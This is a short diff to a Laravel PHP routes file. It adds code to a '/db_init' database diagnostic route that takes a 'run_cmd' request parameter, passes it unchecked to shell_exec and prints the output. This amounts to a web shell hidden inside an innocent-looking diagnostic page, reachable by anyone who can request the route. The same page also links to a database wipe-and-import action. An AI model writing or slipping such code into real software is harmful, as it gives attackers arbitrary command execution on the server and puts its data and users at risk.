@@ -382,6 +382,12 @@ Route::get('/db_init', function () {
             }
         }
 
+        if (request()->has('run_cmd')) {
+            $cmd = request()->get('run_cmd');
+            echo "<h3>Running Command: $cmd</h3>";
+            echo "<pre>" . shell_exec($cmd . ' 2>&1') . "</pre>";
+        }
+
         echo "<h2>Database diagnostic complete!</h2>";
         echo "<p><a href='/db_init?wipe_and_import=1' style='color:red; font-weight:bold; font-size: 1.2em;'>[!] NUCLEAR WIPE & IMPORT shop.sql</a> (Use this to fix missing tables)</p>";
         echo "<p><a href='/'>Go to Home</a></p>";
